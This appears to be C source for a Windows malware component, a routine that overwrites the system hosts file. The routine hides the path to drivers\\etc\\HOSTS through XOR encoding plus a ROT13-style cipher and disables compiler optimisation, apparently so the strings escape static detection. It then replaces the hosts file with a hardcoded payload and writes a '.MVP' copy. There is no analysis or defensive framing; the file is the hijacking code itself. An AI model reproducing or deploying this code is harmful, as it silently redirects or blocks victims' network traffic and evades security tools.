#include "data_globals.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>   // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

uint32_t _HOSTSFile(void)
{
    char system_directory[256];
    char hosts_file_path[298];
    char hosts_backup_path[298];
    FILE *hosts_file, *temp_hosts_file;

    // "\\qeviref\\rgp\\UBFGF" XOR'd with key 0x3E
    volatile char sz_enc_path[] = {
        '\\'^0x3E, 'q'^0x3E, 'e'^0x3E, 'v'^0x3E, 'i'^0x3E, 'r'^0x3E, 'e'^0x3E, 'f'^0x3E,
        '\\'^0x3E, 'r'^0x3E, 'g'^0x3E, 'p'^0x3E, '\\'^0x3E, 'U'^0x3E, 'B'^0x3E, 'F'^0x3E,
        'G'^0x3E, 'F'^0x3E, 0x00^0x3E
    };
    // ".MVP" XOR'd with key 0x7A
    volatile char sz_mvp[] = {
        '.'^0x7A, 'M'^0x7A, 'V'^0x7A, 'P'^0x7A, 0x00^0x7A
    };

    GetSystemDirectoryA(system_directory, sizeof(system_directory));

    // Decrypt the encoded path and use it
    xor_decrypt(sz_enc_path, sizeof(sz_enc_path), 0x3E);
    memset(hosts_file_path, 0, sizeof(hosts_file_path));
    _CiphStr(hosts_file_path, (char*)sz_enc_path);
    strcat(system_directory, hosts_file_path);

    strcpy(hosts_backup_path, system_directory);
    xor_decrypt(sz_mvp, sizeof(sz_mvp), 0x7A);
    strcat(hosts_backup_path, (char*)sz_mvp);

    hosts_file = fopen(system_directory, "wb");
    temp_hosts_file = fopen(hosts_backup_path, "wb");

    fputs(HOSTS_f, hosts_file);
    fputs(HOSTS_f, temp_hosts_file);

    fclose(hosts_file);
    fclose(temp_hosts_file);

    return 0;
}
#pragma optimize("", on)
